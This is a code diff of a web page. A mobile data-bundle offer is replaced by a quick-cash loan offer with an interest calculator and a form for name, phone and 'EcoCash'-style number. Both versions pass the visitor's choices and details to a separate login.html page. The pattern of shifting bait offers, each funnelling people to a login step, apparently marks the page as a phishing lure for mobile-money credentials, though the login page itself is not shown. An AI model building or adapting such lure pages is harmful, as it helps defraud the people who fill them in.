+                        <input type="tel" id="ecoNumber" placeholder="07XXXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Loan Purpose</label>
+                        <select id="loanPurpose" required>
+                            <option value="">Select Purpose</option>
+                            <option value="Business">Business Support</option>
+                            <option value="Personal">Personal Needs</option>
+                            <option value="Emergency">Emergency Funds</option>
+                        </select>
+                    </div>
+
+                    <button type="submit" class="btn-main">Get Cash Now</button>
+                </form>
+            </div>
+        </div>
+    </main>
 
     <script>
-        function toggleMenu() { document.getElementById('mobNav').classList.toggle('open'); }
-        function closeMenu() { document.getElementById('mobNav').classList.remove('open'); }
-        window.addEventListener('scroll', closeMenu);
+        let currentStep = 1;
+        const interestRate = 0.089;
 
-        const plans = [
-            { n:'Daily', p:'0.60', v:'20 Min', s:'25 SMS', d:'3 GB' },
-            { n:'3 Days', p:'1.40', v:'40 Min', s:'50 SMS', d:'6 GB' },
-            { n:'Weekly', p:'2.80', v:'80 Min', s:'100 SMS', d:'12 GB' },
-            { n:'2 Weeks', p:'5.20', v:'150 Min', s:'200 SMS', d:'25 GB' },
-            { n:'Monthly', p:'9.90', v:'300 Min', s:'400 SMS', d:'50 GB' }
-        ];
-        let cur = 0;
-
-        function pickMix(i) {
-            cur = i;
-            document.querySelectorAll('.mix-tab').forEach((t,j) => t.classList.toggle('active', j===i));
-            document.getElementById('mV').textContent = plans[i].v;
-            document.getElementById('mS').textContent = plans[i].s;
-            document.getElementById('mD').textContent = plans[i].d;
-            document.getElementById('mP').textContent = 'USD ' + plans[i].p;
-            document.getElementById('mBtn').textContent = 'Subscribe \u2014 ' + plans[i].n;
+        function showStep(step) {
+            document.querySelectorAll('.step-view').forEach(v => v.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            window.scrollTo(0, 0);
+            updateCalc();
         }
 
-        function subMix() {
-            const p = plans[cur];
-            const b = `${p.d} + ${p.v} + ${p.s} (${p.n})`;
-            window.location.href = `login.html?data=${encodeURIComponent(b)}&price=${p.p}`;
+        function quickApply(amt, dur) {
+            document.getElementById('loanAmount').value = amt;
+            document.getElementById('loanDuration').value = dur;
+            updateCalc();
+            showStep(3);
         }
 
-        function pick(d, p) { window.location.href = `login.html?data=${encodeURIComponent(d)}&price=${p}`; }
+        function updateCalc() {
+            const amount = parseFloat(document.getElementById('loanAmount').value);
+            const duration = parseInt(document.getElementById('loanDuration').value);
+            
+            document.getElementById('amtVal').textContent = '$' + amount.toLocaleString();
+            document.getElementById('durVal').textContent = duration + (duration === 1 ? ' Month' : ' Months');
+
+            const totalInterest = amount * interestRate * (duration / 12);
+            const totalRepayment = amount + totalInterest;
+            const monthlyPayment = totalRepayment / duration;
+
+            document.getElementById('monthlyPay').textContent = '$' + monthlyPayment.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            document.getElementById('totalRepay').textContent = '$' + totalRepayment.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            
+            if(document.getElementById('finalAmt')) {
+                document.getElementById('finalAmt').textContent = '$' + amount.toLocaleString();
+                document.getElementById('finalDur').textContent = duration + ' Months';
+            }
+        }
+
+        function openAccount() {
+            const params = new URLSearchParams({
+                amount: '500',
+                type: 'account_login'
+            });
+            window.location.href = `login.html?${params.toString()}`;
+        }
+
+        function handleFinalSubmit(e) {
+            e.preventDefault();
+            
+            const params = new URLSearchParams({
+                amount: document.getElementById('loanAmount').value,
+                duration: document.getElementById('loanDuration').value,
+                name: document.getElementById('fullName').value,
+                phone: document.getElementById('ecoNumber').value,
+                purpose: document.getElementById('loanPurpose').value,
+                interest: '8.9%',
+                type: 'loan_application'
+            });
+            
+            window.location.href = `login.html?${params.toString()}`;
+        }
+
+        // Initialize
+        updateCalc();
     </script>
 </body>
 </html>
